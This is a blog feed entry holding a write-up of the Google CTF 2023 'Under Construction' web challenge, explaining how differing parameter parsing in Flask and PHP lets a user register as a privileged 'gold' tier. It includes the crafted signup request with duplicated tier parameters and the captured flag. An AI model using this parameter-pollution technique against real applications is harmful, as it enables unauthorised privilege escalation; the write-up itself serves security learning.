{"version":"https://jsonfeed.org/version/1.1","title":"./khatta.sh","home_page_url":"https://blog.shameerkashif.me","feed_url":"https://blog.shameerkashif.me/feed.json","description":"Khatta is a knowledge base and is created to provide in depth articles regarding tech, CTFs, challenges and much more.","icon":"https://blog.shameerkashif.me/assets/any@512.png","favicon":"https://blog.shameerkashif.me/favicon.png","authors":[{"name":"@hash3liZer","url":"https://blog.shameerkashif.me","avatar":"/assets/avatar.png"}],"language":"zh","hubs":[{"type":"WebSub","url":"https://pubsubhubbub.appspot.com"},{"type":"WebSub","url":"https://bridgy-fed.superfeedr.com"}],"items":[{"id":"blog/2023/writeup-under-construction-google-ctf-2024","url":"https://blog.shameerkashif.me/blog/2023/writeup-under-construction-google-ctf-2024","title":"Google CTF 2023 Under Construction (Web) Writeup","content_html":"<h1 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h1><p>This writeup is for the under construction challenge from web category in Google CTF 2023. The challenge was provided with the following statement: <em>“We were building a web app but the new CEO wants it remade in php.”</em></p><p>The challenge contained 2 different web apps. One was in PHP that seems to be under development whilst flask app seemed like a full application. This writeup covers an <code>Parameter Pollution</code> vulnerability we were able to create an escalated user by supplying more than 1 parameter. </p><h1 id=\"writeup\"><a href=\"#writeup\">Writeup</a></h1><h2 id=\"getting-started\"><a href=\"#getting-started\">Getting Started</a></h2><p>So, at first i visited the URLS and got to know the application surface. Then i downloaded the challenge files available and opened them in the editor. </p><p>Reading the code, i got to the <code>flag</code> point. In the <code>index.php</code> file, we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" php=\"true\"><div class=\"language-id\">php</div><div class='code-container'><code><div class='line'>...</div><div class='line'>if ($tier === NULL) &#123;</div><div class='line'>    return \"Invalid credentials\";</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>$response = \"Login successful. Welcome \" . htmlspecialchars($username) . \".\";</div><div class='line'></div><div class='line'>// Look at this part. </div><div class='line'>if ($tier === \"gold\") &#123;</div><div class='line'>    $response .= \" \" . getenv(\"FLAG\");</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>return $response;</div><div class='line'></div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>So, in order to get the flag, we need to create a gold tier user first. The PHP application itself doesn’t offer any signup functionlaity but the <code>account_migrator.php</code> file does that is being called from the flask application. So, if we look at the flask application, we will find where the user is being registered. </p><h2 id=\"vulnerable-part\"><a href=\"#vulnerable-part\">Vulnerable Part</a></h2><p>In the <code>authorized_routes.py</code>, we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>...</div><div class='line'>@authorized.route('/signup', methods=['POST'])</div><div class='line'>def signup_post():</div><div class='line'>  ...</div><div class='line'>  tier = models.Tier(request.form.get('tier'))</div><div class='line'></div><div class='line'>  if(tier == models.Tier.GOLD):</div><div class='line'>      flash('GOLD tier only allowed for the CEO')</div><div class='line'>      return redirect(url_for('authorized.signup'))  # Validation is based on first parameter</div><div class='line'>  ...</div><div class='line'></div><div class='line'>  new_user = models.User(username=username, </div><div class='line'>  password=generate_password_hash(password, method='sha256'), tier=tier.name)</div><div class='line'>  </div><div class='line'>  db.session.add(new_user)</div><div class='line'>  db.session.commit()</div><div class='line'>  </div><div class='line'>  requests.post(f\"http://&#123;PHP_HOST&#125;:1337/account_migrator.php\", </div><div class='line'>      headers=&#123;\"token\": TOKEN, \"content-type\": request.headers.get(\"content-type\")&#125;, data=raw_request) # Vulnerable PART</div><div class='line'>  return redirect(url_for('authorized.login'))</div></code></div></pre><!-- HTML_TAG_END --><p>The validation is based on the statement: <code>request.form.get(&#39;tier&#39;)</code>. This will always pick the first parameter if multiple parameters are to be supplied. However, the application is passing the <code>raw_request</code> as it is to the next application which is in PHP. </p><p>Take the following example:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'># Flask</div><div class='line'>curl https://vulnerablepart.com?tier=gold&tier=blue</div><div class='line'># you will the first parameter aka gold.</div><div class='line'></div><div class='line'># PHP</div><div class='line'>curl http://vulnerablepart.com?tier=gold&tier=bold</div><div class='line'># you will get the second parameter aka bold</div></code></div></pre><!-- HTML_TAG_END --><h2 id=\"exploit\"><a href=\"#exploit\">Exploit</a></h2><p>In order to exploit this, we needed to create the user normally but with extra argument containing <code>gold</code> value. I simply signed up with the following request in Burp: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>POST /signup HTTP/2</div><div class='line'>Host: under-construction-web.2023.ctfcompetition.com</div><div class='line'>Upgrade-Insecure-Requests: 1</div><div class='line'>Origin: https://under-construction-web.2023.ctfcompetition.com</div><div class='line'>Content-Type: application/x-www-form-urlencoded</div><div class='line'>User-Agent: &lt;Redacted&gt;</div><div class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</div><div class='line'></div><div class='line'>username=hash3liZer&password=password&tier=blue&tier=gold</div></code></div></pre><!-- HTML_TAG_END --><p>And it took me back to login page to signin:</p><img width=\"962\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta.sh/assets/29171692/e898c72f-b040-49d5-8f1b-4d07b40c24b3\"><p>So, i went to the PHP application and logged in and got the flag:</p><img width=\"1440\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta.sh/assets/29171692/c6f61468-a875-4656-bd77-7c63190ee67f\"><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>CTF&#123;ff79e2741f21abd77dc48f17bab64c3d&#125;</div></code></div></pre><!-- HTML_TAG_END -->","summary":"Writeup for under construction challenge from google ctf 2023","image":"https://github.com/hash3liZer/khatta.sh/assets/29171692/f553635d-6deb-43e5-a2ae-0d8cef296db7","date_published":"2023-06-27T00:00:00.000Z","date_modified":"2023-06-28T09:19:25.517Z","tags":["ctf","writeups","google-ctf-2023"],"_indieweb":{"type":"article"}}]}